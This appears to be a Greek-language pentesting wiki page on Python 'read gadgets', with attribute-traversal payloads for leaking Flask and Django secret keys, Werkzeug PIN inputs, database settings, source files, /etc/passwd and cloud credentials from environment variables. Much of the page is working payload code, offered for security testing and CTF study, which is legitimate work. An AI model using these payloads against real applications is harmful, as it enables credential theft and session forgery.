# Gadgets εσωτερικής ανάγνωσης Python

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Διαφορερα είδη vulnerabilities, όπως τα [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ή το [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), ενδέχεται να σας επιτρέψουν να **διαβάσετε εσωτερικά δεδομένα της Python, αλλά δεν θα σας επιτρέψουν να εκτελέσετε κώδικα**. Επομένως, ένας pentester θα πρέπει να αξιοποιήσει στο έπακρο αυτά τα δικαιώματα ανάγνωσης, ώστε να **αποκτήσει ευαίσθητα δικαιώματα και να κλιμακώσει το vulnerability**.

### Flask - Ανάγνωση secret key

Η κύρια σελίδα μιας εφαρμογής Flask πιθανότατα θα περιέχει το **`app`** global object, όπου έχει ρυθμιστεί αυτό το **secret**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Σε αυτή την περίπτωση είναι δυνατή η πρόσβαση σε αυτό το object χρησιμοποιώντας οποιοδήποτε gadget για **access global objects** από τη σελίδα [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Στην περίπτωση όπου **η ευπάθεια βρίσκεται σε διαφορετικό python file**, χρειάζεστε ένα gadget για την περιήγηση στα αρχεία, ώστε να φτάσετε στο κύριο αρχείο και να **access το global object `app.secret_key`**, έχοντας τη δυνατότητα να [**κάνετε escalate privileges** γνωρίζοντας αυτό το key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Ένα payload όπως αυτό [από αυτό το writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Χρησιμοποιήστε αυτό το payload για να **διαβάσετε το `app.secret_key`**. Αν το αρχικό bug σάς δίνει επίσης ένα write primitive (για παράδειγμα, class pollution), η ίδια διαδρομή μπορεί να χρησιμοποιηθεί για την αντικατάστασή του και την υπογραφή cookies του Flask με περισσότερα δικαιώματα.

### Werkzeug - machine_id και node uuid

[**Χρησιμοποιώντας αυτά τα payload από αυτό το writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) θα μπορέσετε να αποκτήσετε πρόσβαση στο **machine_id** και στο **uuid** node, τα οποία είναι τα **private bits** που χρειάζεστε για να [**generate το Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) και να αποκτήσετε πρόσβαση στην Python console στο `/console`, αν το **debug mode είναι ενεργοποιημένο**:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Σημειώστε ότι μπορείτε να λάβετε το **τοπικό path του server προς το `app.py`**, δημιουργώντας κάποιο **error** στη web page, το οποίο θα **σας δώσει το path**.

Αν το vulnerability βρίσκεται σε διαφορετικό python file, ελέγξτε το προηγούμενο Flask trick για να αποκτήσετε πρόσβαση στα objects από το κύριο python file.

### Django - SECRET_KEY και settings module

Το Django settings object αποθηκεύεται σε cache στο `sys.modules` μόλις ξεκινήσει η application. Με μόνο read primitives μπορείτε να κάνετε leak το **`SECRET_KEY`**, τα fallback keys, τα database credentials ή τα signing salts:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Αν το ευάλωτο gadget βρίσκεται σε άλλο module, περιηγηθείτε πρώτα στα globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` είναι εξίσου πολύτιμα με το τρέχον `SECRET_KEY`: εξακολουθούν να επικυρώνουν παλιές signed values κατά την rotation. Επίσης, κάντε leak τα `SESSION_ENGINE` και `SESSION_SERIALIZER` για να προσδιορίσετε γρήγορα αν το impact περιορίζεται σε cookie forgery ή αν είναι κάτι ισχυρότερο. Για λεπτομέρειες σχετικά με το web impact, δείτε τη σελίδα [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - ανάγνωση source code και αρχείων

Τα loaded Python modules συνήθως διατηρούν ένα `__loader__`. Οι file-backed loaders συχνά εκθέτουν τα `get_source()` και `get_data()`, τα οποία είναι ιδανικά **read-only primitives** όταν μπορείτε ήδη να αποκτήσετε πρόσβαση σε ένα module object, αλλά όχι στη `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Αυτό είναι πολύ χρήσιμο για να κάνετε dump σε **config modules, blueprints, helper files ή hidden routes** και να ανακτήσετε API keys, DSNs, flag paths ή επιπλέον gadget entry points.

Αν έχετε μόνο subclass enumeration, αναζητήστε τον loader με βάση το όνομα αντί να κάνετε hard-code ένα index:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals του frame των generator / coroutine

Αν μπορείς να δημιουργήσεις ή να προσεγγίσεις ένα αντικείμενο generator/coroutine, το frame του μπορεί να κάνει leak τα globals **χωρίς να χρειάζεται κανένα gadget `__globals__` συνάρτησης**. Αυτό είναι χρήσιμο απέναντι σε φίλτρα που μπλοκάρουν μόνο ονόματα dunder και ξεχνούν attributes του frame, όπως `gi_frame`, `ag_frame`, `cr_frame` ή `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Μόλις αποκτήσετε τα frame globals, συνεχίστε ακριβώς όπως και στα άλλα gadgets (`sys.modules`, settings objects, `os.environ`, κ.λπ.). Τα πρόσφατα sandbox escapes το ανακαλύπτουν ξανά και ξανά, επειδή τα `gi_frame` και `f_globals` δεν είναι dunder attributes και συχνά επιβιώνουν από naive deny-lists.

### Environment variables / cloud creds μέσω loaded modules

Πολλά jails εξακολουθούν να κάνουν import τα `os` ή `sys` κάπου. Μπορείτε να κάνετε abuse οποιασδήποτε προσβάσιμης συνάρτησης `__init__.__globals__`, ώστε να μεταβείτε στο ήδη imported module `os` και να κάνετε dump των **environment variables** που περιέχουν API tokens, cloud keys ή flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Αν το index της subclass φιλτράρεται, χρησιμοποιήστε loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Οι μεταβλητές περιβάλλοντος είναι συχνά τα μόνα secrets που απαιτούνται για τη μετάβαση από read σε πλήρη παραβίαση (cloud IAM keys, database URLs, signing keys κ.λπ.).

### Django-Unicorn class pollution (CVE-2025-24370)

Το `django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) επέτρεπε **class pollution** μέσω ειδικά διαμορφωμένων component requests. Ο ορισμός ενός property path όπως το `__init__.__globals__` έδινε στον attacker πρόσβαση στα globals του component module και σε οποιαδήποτε imported modules (π.χ. `settings`, `os`, `sys`). Από εκεί μπορείτε να κάνετε leak των `SECRET_KEY`, `DATABASES` ή service credentials χωρίς code execution. Το exploit chain βασίζεται αποκλειστικά σε read και χρησιμοποιεί τα ίδια dunder-gadget patterns όπως παραπάνω.

### Gadget collections for chaining

Πρόσφατα CTFs και έρευνα σε pyjail δείχνουν αξιόπιστα read chains που δημιουργούνται αποκλειστικά με attribute access και subclass enumeration. Community-maintained λίστες όπως το [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) καταγράφουν εκατοντάδες minimal gadgets που μπορείτε να συνδυάσετε για να περιηγηθείτε από objects στα `__globals__`, `sys.modules` και τελικά σε sensitive data. Προτιμήστε searches που βασίζονται σε attributes/names αντί για raw subclass indexes, επειδή η θέση των `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` κ.λπ. αλλάζει μεταξύ εκδόσεων της Python και ανάλογα με τα επιπλέον imported libraries.

## References

- [Django documentation για cryptographic signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
